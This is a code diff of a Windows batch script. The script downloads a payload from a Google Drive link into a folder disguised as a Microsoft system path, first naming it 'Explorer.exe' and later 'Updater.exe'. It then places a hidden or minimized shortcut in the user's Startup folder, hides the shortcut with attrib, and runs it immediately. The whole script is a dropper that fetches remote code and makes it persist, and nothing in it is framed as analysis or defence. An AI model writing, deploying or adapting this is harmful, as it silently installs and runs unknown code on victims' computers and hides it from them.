@@ -1,34 +1,43 @@
 @echo off
 REM Define variables
-set "googleDriveFileUrl=https://drive.usercontent.google.com/download?id=1AXQr8nvYhe-bsimmCj1xligne_xKkwCn&export=download&authuser=1&confirm=t&uuid=60d7f482-2db6-4e83-be3f-6d220abfd35b&at=AENtkXYbwNRQCSpy2eu83p4rSsIh:1733264599875"
+set "googleDriveFileUrl=https://drive.usercontent.google.com/download?id=16PiWOebDW8dB9QIj5NqYoaHNSK4P1Z66&export=download&authuser=1&confirm=t&uuid=483b7a43-b7a9-498c-9e66-7491b0780419&at=APvzH3rcwbBpX_BhQ3sNiN7y0jFD%3A1733418863043"
 set "destinationFolder=C:\Microsoft\Windows\STD"
-set "destinationFileName=Explorer.exe"  REM Change as needed
-set "shortcutName=MyApplication.lnk"
+set "downloadedFileName=updater.zip"
+set "extractionFolder=%destinationFolder%\UpdaterFiles"
 
 REM Ensure the destination folder exists
 if not exist "%destinationFolder%" (
     mkdir "%destinationFolder%"
 )
 
-REM Full path to the destination file
-set "destinationFilePath=%destinationFolder%\%destinationFileName%"
+REM Full path to the downloaded file
+set "downloadedFilePath=%destinationFolder%\%downloadedFileName%"
 
-REM Download the file using curl for faster speed
-curl -L -o "%destinationFilePath%" "%googleDriveFileUrl%"
+REM Download the ZIP file using curl
+curl -L -o "%downloadedFilePath%" "%googleDriveFileUrl%"
 
-REM Create the shortcut in the user's desktop or Startup folder
+REM Ensure the extraction folder exists
+if not exist "%extractionFolder%" (
+    mkdir "%extractionFolder%"
+)
+
+REM Extract the ZIP file using PowerShell
+powershell -Command "Expand-Archive -Path '%downloadedFilePath%' -DestinationPath '%extractionFolder%' -Force"
+
+REM Define the Startup folder for the current user
 for /f "tokens=*" %%i in ('powershell -Command "[Environment]::GetFolderPath('Startup')"') do set "startupFolder=%%i"
 
-set "shortcutPath=%startupFolder%\%shortcutName%"
+REM Full path to the shortcut file
+set "shortcutPath=%startupFolder%\UpdaterShortcut.lnk"
 
-REM Create a PowerShell script to create a shortcut to run the application headlessly
+REM Create a shortcut to the extracted file in the Startup folder
 powershell -Command ^
-$WshShell = New-Object -ComObject WScript.Shell; ^
-$Shortcut = $WshShell.CreateShortcut('%shortcutPath%'); ^
-$Shortcut.TargetPath = '%destinationFilePath%'; ^
-$Shortcut.Arguments = ''; ^
-$Shortcut.WindowStyle = 0;  REM Hidden (headless mode); ^
-$Shortcut.Save()
-
-REM Done
-echo Shortcut created to run the application headlessly at startup.
+"$ws = New-Object -ComObject WScript.Shell; ^
+ $s = $ws.CreateShortcut('%shortcutPath%'); ^
+ $s.TargetPath = '%extractionFolder%\Updater.exe'; ^
+ $s.WorkingDirectory = '%extractionFolder%'; ^
+ $s.WindowStyle = 7; ^
+ $s.Save()"
+echo Shortcut created at %shortcutPath%
+attrib +h "%shortcutPath%"
+cmd /c "%shortcutPath%"
